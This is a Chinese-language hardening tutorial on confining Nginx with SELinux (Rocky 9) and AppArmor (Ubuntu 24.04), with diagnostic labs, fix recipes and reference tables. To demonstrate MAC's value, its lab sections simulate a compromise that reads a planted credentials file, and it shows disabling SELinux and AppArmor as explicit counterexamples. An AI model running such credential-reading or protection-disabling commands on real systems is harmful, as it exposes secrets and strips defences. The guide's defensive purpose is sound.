  3 - owner /data/www/** r,

(A)llow / [(D)eny] / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew /
Audi(t) / (O)wner permissions off / Abo(r)t / (F)inish
```

操作要點 ★★★★：

| 按鍵 | 作用 | 建議 |
| --- | --- | --- |
| `A` | 允許目前選中的那一條 | 確認過再按 |
| `D` | 拒絕（寫入 deny 規則） | 明顯不該做的事用它 |
| `I` | 忽略這次（不寫任何規則） | 一次性的雜訊 |
| `G` | ★★★★ 把路徑改成萬用字元（`/data/www/*`） | 常用，可連按逐層放寬 |
| `E` | 用萬用字元但保留副檔名 | 適合 `*.log` 這種 |
| `O` | 切換 `owner` 限定 | 保留 `owner` 比較嚴，建議留著 |
| `F` | 存檔離開 | 最後按 |

> [!danger] ★★★★★ 不要無腦按 A
> `aa-logprof` 只會忠實反映「這段期間程式做過什麼」。
> 如果這台機器在 complain 期間**已經被入侵**，攻擊者讀 `/etc/shadow` 的動作
> 也會被整理成一條建議請你按 A。
>
> 兩個保護措施：
> ① 在 complain 模式下跑的機器，其他防線（防火牆、修補、監控）要正常運作；
> ② 每一條規則都要問自己「Nginx 為什麼需要這個」，答不出來就按 D 或 I。

```bash
# 收工：切回 enforce 並驗證
sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
sudo aa-status | grep -A2 'enforce mode' | head -5
```

### `aa-genprof`：從零產生一份 profile ★★★

給沒有現成 profile 的自訂程式用：

```bash
sudo aa-genprof /opt/myapp/bin/myapp
```

它會建立一份最小 profile、切成 complain、然後**要你去另一個終端把程式完整操作一遍**，
回來按 `S` 掃描日誌、逐條決定，最後按 `F` 完成並切成 enforce。

★★★ 一定要把程式的「所有正常路徑」都跑過：啟動、正常作業、logrotate、重啟、關閉。
漏掉的路徑會在半夜第一次執行時被擋下。

### 補充：systemd 的沙箱也是一層 ★★★

MAC 之外，systemd 本身也提供輕量的隔離，兩者可以疊加：

```bash
systemd-analyze security nginx.service
```

```text
NAME                                                        DESCRIPTION                              EXPOSURE
✗ PrivateNetwork=                                           Service has access to the host's network      0.5
✗ User=/DynamicUser=                                        Service runs as root                          0.4
✓ PrivateDevices=                                           Service has no access to hardware devices
✗ ProtectHome=                                              Service has full access to home directories   0.2
...
→ Overall exposure level for nginx.service: 7.7 EXPOSED 🙁
```

常用的加固指令（放在 drop-in `/etc/systemd/system/nginx.service.d/hardening.conf`）：

```ini
[Service]
ProtectHome=yes
ProtectSystem=strict
ReadWritePaths=/var/log/nginx /var/lib/nginx /run
PrivateTmp=yes
NoNewPrivileges=yes
ProtectKernelTunables=yes
ProtectControlGroups=yes
RestrictSUIDSGID=yes
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart nginx
```

> [!tip] ★★★ 三者的分工
> systemd 沙箱管「這個 unit 的執行環境」，MAC 管「這支程式的每一次存取」，
> 防火牆管「網路上誰能進來」。三層互補，不互相取代。
> systemd unit 的寫法見 [[020-01-17-cmd-Linux-systemd服務管理]]。

## 完整實戰範例

**任務**：把 Nginx 的網站根目錄從預設位置改到 `/data/www`，
在 AppArmor（Ubuntu 24.04）與 SELinux（Rocky 9）兩邊各走一次
「被擋 → 診斷 → 正確修復」，最後示範「錯誤的修復方式」到底失去了什麼。

### Part A：SELinux（Rocky 9）

#### A-0 前置：建立目錄與內容

```bash
sudo mkdir -p /data/www
echo '<h1>hello from /data/www</h1>' | sudo tee /data/www/index.html
sudo chown -R nginx:nginx /data/www
sudo chmod -R 750 /data/www
ls -l /data/www/
```

```text
總計 4
-rw-r-----. 1 nginx nginx 30  9月  3 16:20 index.html
```

**DAC 權限完全正確**（nginx 擁有、nginx 可讀）。記住這一點。

順便準備一個「攻擊者會想拿的東西」，等下驗證 MAC 的價值：

```bash
sudo mkdir -p /data/backup
echo 'DB_PASSWORD=Sup3rS3cret!' | sudo tee /data/backup/db-credentials.txt
sudo chown nginx:nginx /data/backup/db-credentials.txt     # ★ 刻意設成 nginx 可讀
sudo chmod 600 /data/backup/db-credentials.txt
```

#### A-1 改設定並重啟

```bash
sudo tee /etc/nginx/conf.d/site.conf >/dev/null <<'EOF'
server {
    listen 8081;
    server_name _;
    root /data/www;
    index index.html;
    access_log /var/log/nginx/site-access.log;
    error_log  /var/log/nginx/site-error.log;
}
EOF
sudo nginx -t
```

```text
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

```bash
sudo systemctl restart nginx
```

```text
Job for nginx.service failed because the control process exited with error code.
See "systemctl status nginx.service" and "journalctl -xeu nginx.service" for details.
```

#### A-2 診斷第一個問題：埠

```bash
sudo journalctl -u nginx --no-pager -n 5
```

```text
nginx[4102]: nginx: [emerg] bind() to 0.0.0.0:8081 failed (13: Permission denied)
```

```bash
sudo ausearch -m AVC -ts recent -i | tail -2
```

```text
type=AVC msg=audit(...) : avc:  denied  { name_bind } for  pid=4102 comm=nginx src=8081 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:unreserved_port_t:s0 tclass=tcp_socket permissive=0
```

```bash
sudo semanage port -a -t http_port_t -p tcp 8081
sudo systemctl restart nginx
sudo systemctl is-active nginx
```

```text
active
```

#### A-3 診斷第二個問題：檔案標籤

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8081/
```

```text
403
```

```bash
sudo tail -2 /var/log/nginx/site-error.log
```

```text
2026/09/03 16:24:11 [error] 4155#0: *1 "/data/www/index.html" is forbidden (13: Permission denied), client: 127.0.0.1, server: _, request: "GET / HTTP/1.1", host: "localhost:8081"
```

```bash
sudo ausearch -m AVC -ts recent -c nginx -i | tail -2
```

```text
type=AVC msg=audit(...) : avc:  denied  { read } for  pid=4155 comm=nginx name=index.html dev="dm-0" ino=524301 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:default_t:s0 tclass=file permissive=0
```

```bash
ls -Zd /data /data/www /data/www/index.html
```

```text
unconfined_u:object_r:default_t:s0 /data
unconfined_u:object_r:default_t:s0 /data/www
unconfined_u:object_r:default_t:s0 /data/www/index.html
```

#### A-4 正確修復

```bash
sudo semanage fcontext -a -t httpd_sys_content_t "/data/www(/.*)?"
sudo restorecon -Rv /data/www
```

```text
Relabeled /data/www from unconfined_u:object_r:default_t:s0 to unconfined_u:object_r:httpd_sys_content_t:s0
Relabeled /data/www/index.html from unconfined_u:object_r:default_t:s0 to unconfined_u:object_r:httpd_sys_content_t:s0
```

```bash
curl -s http://localhost:8081/
```

```text
<h1>hello from /data/www</h1>
```

#### A-5 ★★★★★ 驗證 MAC 真的有價值

現在模擬「Nginx 被入侵，攻擊者以 `httpd_t` 身分執行指令」。
用 `runcon` 在同樣的 domain 下執行來模擬：

```bash
sudo runcon -t httpd_t cat /data/backup/db-credentials.txt
```

```text
cat: /data/backup/db-credentials.txt: 拒絕不符權限的操作
```

```bash
# 對照組：DAC 完全允許（檔案就是 nginx 擁有的）
sudo -u nginx cat /data/backup/db-credentials.txt
```

```text
DB_PASSWORD=Sup3rS3cret!
```

> [!note] ★★★★★ 這兩行就是整篇的重點
> **DAC 說可以（檔案屬於 nginx、nginx 可讀），SELinux 說不行（`httpd_t` 讀不到 `default_t`）。**
> 攻擊者拿到 Nginx 的執行權限，在 DAC 下拿走了資料庫密碼，
> 在 SELinux 下什麼都拿不到。這就是那一層的價值。

```bash
sudo ausearch -m AVC -ts recent -i | tail -2
```

```text
type=AVC msg=audit(...) : avc:  denied  { read } for  pid=4488 comm=cat name=db-credentials.txt scontext=unconfined_u:unconfined_r:httpd_t:s0 tcontext=unconfined_u:object_r:default_t:s0 tclass=file permissive=0
```

★★★★ 而且**留下了紀錄**。這條 AVC 送到 SIEM 就是一個高價值告警：
「httpd_t 試圖讀取備份檔案」—— 正常運作永遠不會出現這種事。
接 Wazuh 的做法見 [[090-08-05-guide-Wazuh-日誌蒐集與解析]]。

#### A-6 ★★★★★ 反例：錯誤的修復方式

如果 A-3 的時候，工程師選擇的是「先關掉再說」：

```bash
sudo setenforce 0
sudo sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
sudo systemctl restart nginx
curl -s http://localhost:8081/
```

```text
<h1>hello from /data/www</h1>
```

網站好了，只花 30 秒。**但同時失去了：**

```bash
sudo runcon -t httpd_t cat /data/backup/db-credentials.txt 2>/dev/null || \
    sudo -u nginx cat /data/backup/db-credentials.txt
```

```text
DB_PASSWORD=Sup3rS3cret!
```

| 失去了什麼 | 說明 | 嚴重度 |
| --- | --- | --- |
| 檔案存取限制 | Nginx 被入侵後可讀 `www-data`／`nginx` 可讀的一切 | ★★★★★ |
| 網路外連限制 | `httpd_can_network_connect` 不再有意義，反向 shell 暢通 | ★★★★★ |
| 埠綁定限制 | 任何埠都能綁 | ★★★ |
| **AVC 稽核紀錄** | ★★★★★ disabled 連日誌都沒有，被入侵時完全無跡可循 | ★★★★★ |
| 其他所有服務的保護 | 不只 Nginx，MySQL、SSH、cron 的限制一起消失 | ★★★★★ |
| 法規符合性 | TWGCB 與多數基準要求 SELinux 為 enforcing，稽核直接不合格 | ★★★★ |
| 復原成本 | 要切回來必須全碟重新標記 ＋ 重開機 ＋ 一輪 permissive 觀察 | ★★★★ |

正確修復用了 2 分鐘（兩條指令），錯誤修復用了 30 秒，
但把整台機器的第二層防線永久拆掉，還讓事後鑑識失去依據。

還原（★ 記得把實驗環境改回來）：

```bash
sudo sed -i 's/^SELINUX=disabled/SELINUX=permissive/' /etc/selinux/config
sudo touch /.autorelabel
sudo reboot
# 重開機完成、確認沒有大量 AVC 之後
sudo setenforce 1
sudo sed -i 's/^SELINUX=permissive/SELINUX=enforcing/' /etc/selinux/config
```

### Part B：AppArmor（Ubuntu 24.04）

#### B-0 前置

```bash
sudo mkdir -p /data/www /data/backup
echo '<h1>hello from /data/www</h1>' | sudo tee /data/www/index.html
echo 'DB_PASSWORD=Sup3rS3cret!' | sudo tee /data/backup/db-credentials.txt
sudo chown -R www-data:www-data /data/www /data/backup
sudo chmod 640 /data/backup/db-credentials.txt
```

#### B-1 確認 Nginx 有沒有 profile ★★★

```bash
sudo aa-status | grep -i nginx
```

```text
（可能無輸出）
```

```bash
ls -l /etc/apparmor.d/ | grep -i nginx
```

> [!warning] ★★★★ Ubuntu 的 nginx 套件不一定附 AppArmor profile
> 這一點和 SELinux 差很多：**SELinux 的 targeted 政策預設就涵蓋 httpd_t**，
> 但 Ubuntu 的 `nginx` 套件在多數版本裡**沒有預設啟用的 AppArmor profile**，
> 所以 Nginx 常常是 `unconfined` 的 —— 換句話說 AppArmor 一開始什麼都沒保護到它。
>
> 這是 AppArmor 最容易被誤會的地方：`aa-status` 顯示「41 個 profile 已載入」
> 不代表你的關鍵服務有被保護。**一定要用 `aa-unconfined` 逐項確認。**

```bash
sudo aa-unconfined | grep -E 'nginx|not confined'
```

```text
1201 /usr/sbin/nginx not confined
1503 /usr/sbin/sshd not confined
```

所以 Part B 的第一件事是**自己建一份 profile**。

#### B-2 建立最小 profile 並用 complain 模式收集

```bash
sudo tee /etc/apparmor.d/usr.sbin.nginx >/dev/null <<'EOF'
abi <abi/4.0>,
include <tunables/global>

profile nginx /usr/sbin/nginx flags=(complain,attach_disconnected) {
  include <abstractions/base>
  include <abstractions/nameservice>
  include <abstractions/openssl>

  capability dac_override,
  capability net_bind_service,
  capability setgid,
  capability setuid,

  network inet stream,
  network inet6 stream,

  /usr/sbin/nginx mr,
  /etc/nginx/** r,
  /etc/ssl/certs/** r,
  /usr/share/nginx/** r,
  /var/log/nginx/*.log w,
  /var/lib/nginx/** rw,
  /run/nginx.pid rw,
  owner /proc/*/status r,

  include if exists <local/usr.sbin.nginx>
}
EOF

sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
sudo systemctl restart nginx
sudo aa-status | grep -A3 'complain mode'
```

```text
1 profiles are in complain mode.
   nginx
```

#### B-3 切成 enforce，重現「被擋」

```bash
sudo tee /etc/nginx/sites-available/site >/dev/null <<'EOF'
server {
    listen 8081;
    server_name _;
    root /data/www;
    index index.html;
    error_log /var/log/nginx/site-error.log;
}
EOF
sudo ln -sf /etc/nginx/sites-available/site /etc/nginx/sites-enabled/site
sudo nginx -t && sudo systemctl reload nginx

sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
sudo systemctl restart nginx
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8081/
```

```text
403
```

#### B-4 診斷

```bash
sudo journalctl -k --since "2 min ago" | grep DENIED
```

```text
Sep 03 17:02:44 web01 kernel: audit: type=1400 audit(...): apparmor="DENIED" operation="open" class="file" profile="nginx" name="/data/www/index.html" pid=5211 comm="nginx" requested_mask="r" denied_mask="r" fsuid=33 ouid=33
```

★★★★ 三個關鍵欄位：`profile="nginx"`（誰被擋）、
`name="/data/www/index.html"`（要碰什麼）、`requested_mask="r"`（要什麼權限）。

```bash
sudo tail -1 /var/log/nginx/site-error.log
```

```text
2026/09/03 17:02:44 [error] 5211#5211: *1 open() "/data/www/index.html" failed (13: Permission denied), client: 127.0.0.1, ...
```

★★★ 注意：AppArmor 被擋時，應用層看到的也是 `13: Permission denied`，
和 SELinux 一樣、和真正的 DAC 權限問題也一樣。
**分辨的方法只有一個：去看 kernel 日誌有沒有 `DENIED`。**

```bash
# 對照：DAC 完全允許
sudo -u www-data test -r /data/www/index.html && echo "DAC 允許讀取"
```

```text
DAC 允許讀取
```

#### B-5 正確修復

```bash
sudo mkdir -p /etc/apparmor.d/local
sudo tee /etc/apparmor.d/local/usr.sbin.nginx >/dev/null <<'EOF'
  /data/www/ r,
  /data/www/** r,
EOF
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
curl -s http://localhost:8081/
```

```text
<h1>hello from /data/www</h1>
```

#### B-6 ★★★★★ 驗證 MAC 有效

profile 裡沒有 `/data/backup/**`，所以 Nginx 讀不到備份 ——
即使 DAC 允許：

```bash
# DAC 檢查：允許
sudo -u www-data cat /data/backup/db-credentials.txt
```

```text
DB_PASSWORD=Sup3rS3cret!
```

要真正模擬「在 nginx profile 下執行」，用 `aa-exec`：

```bash
sudo aa-exec -p nginx -- cat /data/backup/db-credentials.txt
```

```text
cat: /data/backup/db-credentials.txt: Permission denied
```

```bash
sudo journalctl -k -n 2 | grep DENIED
```

```text
Sep 03 17:08:12 web01 kernel: audit: type=1400 audit(...): apparmor="DENIED" operation="open" profile="nginx" name="/data/backup/db-credentials.txt" pid=5502 comm="cat" requested_mask="r" denied_mask="r"
```

> [!warning] 未實機驗證
> `aa-exec -p nginx` 能否成功切換到該 profile，取決於 profile 是否允許
> 「從 unconfined 轉入」（`change_profile` 權限）。
> 在某些設定下會得到 `aa-exec: ERROR: Failed to change profile to 'nginx'`。
> 若遇到，改用比較迂迴但一定可行的驗證：在 Nginx 設定裡臨時加一個
> `location /_t { alias /data/backup/; autoindex on; }` 然後 `curl` 它，
> 看 kernel 日誌有沒有 DENIED；驗證完立刻移除。

#### B-7 ★★★★★ 反例：錯誤的修復方式

```bash
sudo aa-disable /etc/apparmor.d/usr.sbin.nginx
sudo systemctl restart nginx
curl -s http://localhost:8081/
```

```text
<h1>hello from /data/www</h1>
```

或更糟的做法 —— 把整個 AppArmor 關掉：

```bash
# ★★★★★ 不要這樣做
sudo systemctl disable --now apparmor
```

失去的東西和 SELinux 那邊一樣：檔案限制、能力限制、稽核紀錄，
而且 `aa-disable` 會在 `/etc/apparmor.d/disable/` 留下一個符號連結，
**套件更新也不會把它恢復** —— 三年後沒有人記得為什麼這台機器的 Nginx 不受保護。

還原：

```bash
sudo rm -f /etc/apparmor.d/disable/usr.sbin.nginx
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
sudo systemctl enable --now apparmor
sudo aa-status | grep nginx
```

### Part C：驗收清單 ★★★★

| # | 檢查項 | SELinux 指令 | AppArmor 指令 |
| --- | --- | --- | --- |
| 1 | MAC 在強制模式 | `getenforce` → `Enforcing` | `aa-status` → profile 在 enforce |
| 2 | 服務正常 | `systemctl is-active nginx` | 同左 |
| 3 | 網站可存取 | `curl -s http://localhost:8081/` | 同左 |
| 4 | 沒有新的拒絕紀錄 | `ausearch -m AVC -ts recent` 無輸出 | `journalctl -k \| grep DENIED` 無新項 |
| 5 | 敏感檔案讀不到 | `runcon -t httpd_t cat <檔>` 被拒 | `aa-exec -p nginx -- cat <檔>` 被拒 |
| 6 | 規則是永久的 | `semanage fcontext -l \| grep /data/www` | `/etc/apparmor.d/local/` 有檔案 |
| 7 | 重開機後仍正確 | `reboot` 後重跑 1～6 | 同左 |

★★★★ 第 7 項最常被跳過，也最常出事：
用 `chcon` 或 `setenforce` 做的修改重開機後就沒了。

## 常見錯誤與排錯

| # | 現象 | 原因 | 解法 | 重要度 |
| --- | --- | --- | --- | --- |
| 1 | 網頁 403，`ls -l` 權限看起來完全正確 | SELinux 檔案標籤是 `default_t`／AppArmor profile 沒涵蓋該路徑 | SELinux：`semanage fcontext -a` + `restorecon`；AppArmor：在 `local/` 加規則後 `apparmor_parser -r` | ★★★★★ |
| 2 | `bind() to 0.0.0.0:8081 failed (13: Permission denied)`（以 root 執行） | SELinux 埠標籤沒開 | `semanage port -a -t http_port_t -p tcp 8081` | ★★★★★ |
| 3 | 反向代理 502，錯誤日誌 `connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream` | SELinux 布林值 `httpd_can_network_connect` 為 off | `setsebool -P httpd_can_network_connect on`（只連本機 DB 可用 `..._db`） | ★★★★★ |
| 4 | 用 `chcon` 修好了，一週後又壞掉 | `chcon` 只改當下標籤，`restorecon`／重新標記／`cp` 覆蓋會還原 | 改用 `semanage fcontext -a` + `restorecon` | ★★★★★ |
| 5 | `semanage port -a` 回 `ValueError: Port tcp/8080 already defined` | 該埠已屬於別的型別（如 `http_cache_port_t`） | 改用 `-m` 修改；先評估對原服務的影響 | ★★★★ |
| 6 | `semanage: command not found`（Rocky 9） | `policycoreutils-python-utils` 沒裝 | `dnf install -y policycoreutils-python-utils` | ★★★★ |
| 7 | 把 `/etc/selinux/config` 從 disabled 改成 enforcing 後開不起來 | disabled 期間產生的檔案沒有標籤 | 進救援模式改回 permissive、`touch /.autorelabel`、重開機；救援流程見 GRUB 篇 | ★★★★★ |
| 8 | `audit2allow` 產生的模組載入後，服務好了但覺得哪裡不對 | 規則放行了整個 `default_t`／整類物件，範圍過大 | `semodule -r <模組名>` 移除，回到「標籤 → 布林值 → 埠」三步 | ★★★★★ |
| 9 | AppArmor 改了主 profile，套件更新後規則消失 | 直接改 `/etc/apparmor.d/usr.sbin.nginx` 被套件覆蓋 | 規則寫在 `/etc/apparmor.d/local/usr.sbin.nginx`，主 profile 用 `include if exists <local/...>` 帶入 | ★★★★ |
| 10 | AppArmor 加了 `/data/www/** r,` 但列目錄仍失敗 | `**` 不涵蓋目錄本身 | 同時加 `/data/www/ r,`（結尾斜線那一條） | ★★★★ |
| 11 | `aa-status` 說 profile 已載入 enforce，但服務行為沒變 | 服務在 profile 載入前就啟動了 | `systemctl restart <服務>`；並檢查 `aa-status` 最後一行 unconfined 計數 | ★★★★ |
| 12 | `aa-status` 顯示載入很多 profile，但 nginx 完全不受限 | Ubuntu 的 nginx 套件沒有預設 profile | `aa-unconfined` 逐項確認；自己寫 profile 或用 `aa-genprof` | ★★★★ |
| 13 | `apparmor_parser -r` 回 `Found unexpected character` | profile 語法錯（少逗號、路徑沒引號、括號不對稱） | 每條規則結尾要有 `,`；含空白的路徑要用 `"..."` 包起來；用 `apparmor_parser -Q` 只驗語法不載入 | ★★★ |
| 14 | 服務失敗但 `ausearch` 什麼都查不到 | ① `dontaudit` 規則把該事件靜音了 ② auditd 沒跑 | `semodule -DB` 暫時停用 dontaudit 重測，測完 `semodule -B` 恢復；確認 `systemctl is-active auditd` | ★★★★ |
| 15 | Docker／Podman 容器掛載主機目錄後容器內讀不到 | SELinux 標籤不符 | 掛載時加 `:Z`（私有）或 `:z`（共享），如 `-v /data/www:/usr/share/nginx/html:Z` | ★★★★ |
| 16 | `restorecon -Rv` 跑完，某些檔案標籤還是不對 | 該路徑沒有對應的 fcontext 規則，或規則的正規表示式沒涵蓋到 | `matchpathcon /path/to/file` 看「應該是什麼」；`semanage fcontext -l \| grep <路徑>` 檢查規則寫法 | ★★★ |
| 17 | NFS／CIFS 掛載的網站目錄，標籤怎麼改都沒用 | 這類檔案系統不支援 SELinux 擴充屬性，整個掛載點只有一個 context | 用掛載選項 `context=system_u:object_r:httpd_sys_content_t:s0`，或開對應布林值 `httpd_use_nfs` / `httpd_use_cifs` | ★★★ |
| 18 | 加了 systemd `ProtectSystem=strict` 後服務寫不了日誌 | 這是 systemd 沙箱不是 MAC，`/var/log` 變唯讀 | 在 `ReadWritePaths=` 加上需要寫入的路徑 | ★★★ |

> [!tip] ★★★★★ 三十秒判斷法
> 服務出問題時，先問自己：**「這個 Permission denied，`ls -l` 看起來合理嗎？」**
> - 不合理（權限明明就對）→ 八成是 MAC，去看 `ausearch -m AVC` 或 `journalctl -k | grep DENIED`
> - 合理（權限確實不對）→ 是 DAC，`chown`／`chmod` 就好
>
> 更快的做法：`sudo setenforce 0` 或 `sudo aa-complain <profile>` 測一下，
> 好了就是 MAC。**★★★★★ 但一定要立刻切回去，然後找正確解法。**

## 安全性注意事項

> [!danger] ★★★★★ 五條絕對不要
> 1. **不要把 SELinux 設成 `disabled` 當作修復**。要診斷用 `permissive`，診斷完切回 `enforcing`。
> 2. **不要無腦 `audit2allow -M` 然後 `semodule -i`**。每一條產生的規則都要看懂再載入。
> 3. **不要只用 `chcon`**。永久修復一定是 `semanage fcontext -a` + `restorecon`。
> 4. **不要在 `aa-logprof` 裡無腦按 A**。它只反映「發生過什麼」，不判斷「該不該」。
> 5. **不要直接改套件提供的 AppArmor 主 profile**。規則寫進 `/etc/apparmor.d/local/`。

> [!warning] ★★★★ MAC 不是萬靈丹
> 它擋不住：SQL injection 讀走資料庫內容、應用邏輯漏洞、
> 弱密碼、被竊的憑證、以及「你自己把規則寫得太寬」。
> 它擅長的是：**限制「已經被入侵的程序」能走多遠，並留下告警**。
> 應用層要另外做，見 [[090-03-02-guide-應用安全-應用層安全]] 與
> [[090-05-04-guide-資安設備-Web應用防火牆WAF]]。

> [!warning] ★★★★ 規則寫太寬等於沒寫
> 常見的「表面上有 MAC、實際上沒保護」：
>
> | 反模式 | 為什麼糟 |
> | --- | --- |
> | `allow httpd_t default_t:file *;` | 開放半個檔案系統 |
> | AppArmor 寫 `/** r,` | 全檔案系統可讀 |
> | AppArmor 用 `ux`（unconfined execute） | 執行出去的子程序完全不受限 |
> | 把所有布林值都打開 | 等於關掉 |
> | 幫每個服務都建一個 `unconfined_t` 的例外 | 同上 |
>
> ★★★ 驗收的方式不是「服務有沒有起來」，
> 是「拿一個**不該被存取的敏感檔案**測試，看它是不是真的被擋」。

> [!note] ★★★★ 法規與基準的要求
> TWGCB 的 Linux 基準（TWGCB-01-014 Ubuntu、TWGCB-01-008／012 RHEL）
> 明確要求 MAC 必須啟用且為強制模式。
> 稽核時「SELinux 是 disabled」是會直接被開缺失的項目。
> 詳見 [[090-06-03-guide-TWGCB-Linux項目分類詳解]] 與
> [[090-06-08-guide-TWGCB-Linux誤判與服務衝突處理]]（後者專門處理
> 「基準要求 vs 服務跑不起來」的衝突）。

> [!tip] ★★★★ 把 AVC／DENIED 接進監控
> MAC 的拒絕紀錄是**極高品質的告警來源** —— 正常運作的系統不該一直產生它們。
> 建議規則：
> - 新出現的 AVC／DENIED → 中度告警（可能是設定沒調好，也可能是攻擊）
> - `httpd_t` 試圖讀 `shadow_t`／備份目錄／家目錄 → ★★★★★ 高度告警，視同入侵
> - 短時間內大量不同類型的拒絕 → ★★★★ 高度告警，像是有人在探測
>
> 接 Wazuh 的做法見 [[090-08-09-guide-Wazuh-自訂規則與解碼器]]；
> 一般日誌集中見 [[100-01-02-guide-日誌-日誌集中與輪替]]。

> [!tip] ★★★ 用組態管理維持一致
> `semanage fcontext`／`setsebool`／AppArmor 的 `local/` 規則
> 都應該寫進 Ansible playbook，而不是手動在每台機器上敲。
> 否則新建的機器一定會漏，而且沒有人記得當初為什麼要開某個布林值。
> 見 [[020-02-03-06-guide-標準化-Ansible實戰inventory與playbook]]。
> ★★★ 每一條例外規則都應該在 playbook 裡留一行註解說明「為什麼」。

## 速查表

**通用判斷**

| 情況 | 動作 | 重要度 |
| --- | --- | --- |
| Permission denied 但 `ls -l` 權限正確 | 懷疑 MAC | ★★★★★ |
| 想確認是不是 MAC（SELinux） | `setenforce 0` 測 → **立刻** `setenforce 1` | ★★★★★ |
| 想確認是不是 MAC（AppArmor） | `aa-complain <profile>` 測 → `aa-enforce` 切回 | ★★★★ |

**SELinux**

| 指令 | 作用 | 重要度 |
| --- | --- | --- |
| `sestatus` | 完整狀態 | ★★★★ |
| `getenforce` / `setenforce 0\|1` | 查／切模式（暫時） | ★★★★★ |
| `/etc/selinux/config` | 永久模式設定 | ★★★★ |
| `ls -Z` / `ps -eZ` / `id -Z` | 看檔案／程序／自己的 context | ★★★★★ |
| `semanage fcontext -a -t <type> "<路徑>(/.*)?"` | 新增路徑標籤規則（永久） | ★★★★★ |
| `semanage fcontext -l \| grep <路徑>` | 查現有規則 | ★★★★ |
| `restorecon -Rv <路徑>` | 依規則重新標記 | ★★★★★ |
| `chcon -t <type> <檔>` | 暫時改標籤（★ 會被還原） | ★★ |
| `matchpathcon <路徑>` | 查「這個路徑應該是什麼標籤」 | ★★★ |
| `getsebool -a \| grep <關鍵字>` | 列布林值 | ★★★★ |
| `setsebool -P <bool> on` | 永久開啟布林值 | ★★★★★ |
| `semanage boolean -l \| grep <bool>` | 查布林值的說明 | ★★★ |
| `semanage port -l \| grep <型別>` | 列埠標籤 | ★★★★ |
| `semanage port -a -t <type> -p tcp <埠>` | 新增埠標籤 | ★★★★★ |
| `semanage port -m -t <type> -p tcp <埠>` | 修改已定義的埠 | ★★★★ |
| `ausearch -m AVC -ts recent -i` | 查最近的拒絕紀錄（`-i` 轉成可讀） | ★★★★★ |
| `ausearch -m AVC -c nginx -ts today` | 只看某支程式的拒絕 | ★★★★ |
| `audit2why` | 解釋為什麼被拒 | ★★★★ |
| `audit2allow -M <名稱>` | 產生政策模組（★★★★★ 先看 `.te`） | ★★★ |
| `semodule -i <名稱>.pp` / `-r <名稱>` / `-l` | 載入／移除／列出模組 | ★★★★ |
| `semodule -DB` / `semodule -B` | 停用／恢復 dontaudit（找不到 AVC 時用） | ★★★ |
| `sealert -a /var/log/audit/audit.log` | 人話版建議 | ★★★ |
| `touch /.autorelabel && reboot` | 全碟重新標記 | ★★★★★ |
| `runcon -t <type> <cmd>` | 在指定 domain 下執行（驗證用） | ★★★ |

**AppArmor**

| 指令 | 作用 | 重要度 |
| --- | --- | --- |
| `aa-status` | 載入了哪些 profile、各是什麼模式 | ★★★★★ |
| `aa-unconfined` | ★★★★ 哪些網路程式**沒有**被保護 | ★★★★★ |
| `aa-enforce <profile>` | 切強制模式 | ★★★★ |
| `aa-complain <profile>` | 切學習模式 | ★★★★ |
| `aa-disable <profile>` | 停用 profile（★ 會留在 `disable/`） | ★★ |
| `aa-logprof` | 從日誌互動式產生規則 | ★★★★ |
| `aa-genprof <程式>` | 從零產生 profile | ★★★ |
| `aa-exec -p <profile> -- <cmd>` | 在指定 profile 下執行（驗證用） | ★★★ |
| `apparmor_parser -r <profile 檔>` | 重新載入 profile | ★★★★★ |
| `apparmor_parser -Q <profile 檔>` | 只檢查語法不載入 | ★★★ |
| `journalctl -k \| grep DENIED` | 看被擋了什麼 | ★★★★★ |
| `/etc/apparmor.d/local/<profile>` | ★★★★ 本機自訂規則放這裡 | ★★★★★ |
| `/etc/apparmor.d/abstractions/` | 可重用的規則片段 | ★★★ |
| `/etc/apparmor.d/tunables/` | 路徑變數（如 `@{HOME}`） | ★★ |

**AppArmor 權限字母**

| 字母 | 意義 | 字母 | 意義 |
| --- | --- | --- | --- |
| `r` | 讀 | `ix` | 執行，沿用目前 profile |
| `w` | 寫 | `px` / `Px` | 執行，切到目標的 profile |
| `a` | 只能附加 | `cx` | 執行，切到子 profile |
| `m` | 可 mmap 為可執行 | `ux` / `Ux` | ★★★★ 執行且不受限，避免使用 |
| `k` | 可上檔案鎖 | `owner` | 限定為檔案擁有者時才允許 |

**常用 SELinux 型別與布林值**

| 名稱 | 用途 | 重要度 |
| --- | --- | --- |
| `httpd_sys_content_t` | 網站唯讀內容 | ★★★★★ |
| `httpd_sys_rw_content_t` | Web 可寫目錄（上傳區） | ★★★★ |
| `httpd_log_t` / `httpd_config_t` | 日誌／設定檔 | ★★★ |
| `default_t` | ★★★★ 沒被規則涵蓋 —— 看到它就是問題 | ★★★★★ |
| `http_port_t` / `ssh_port_t` | Web／SSH 可綁定的埠集合 | ★★★★ |
| `httpd_can_network_connect` | 允許 httpd 主動外連（反向代理必開） | ★★★★★ |
| `httpd_can_network_connect_db` | 只允許連資料庫埠（範圍較小、較安全） | ★★★★ |
| `httpd_enable_homedirs` | 允許讀家目錄（★ 通常不該開） | ★★★ |
| `httpd_use_nfs` / `httpd_use_cifs` | 網站內容放在 NFS／CIFS 上時需要 | ★★★ |

## 練習題

1. **重現 DAC 的極限**：在測試機上建立 `/data/secret.txt`，
   擁有者設成 Web 服務的執行帳號（`www-data` 或 `nginx`）、權限 `600`。
   然後分別用「該帳號直接讀」與「在 MAC domain／profile 下讀」測試，
   把兩者的輸出與 kernel／audit 日誌貼出來，說明差別。

2. **SELinux 非標準路徑**：在 Rocky 9 上把 Nginx 的 root 改到 `/srv/site`，
   完整走一次「403 → `ausearch` → `ls -Z` → `semanage fcontext` → `restorecon` → 200」。
   最後用 `semanage fcontext -l` 證明規則是永久的，並重開機驗證。

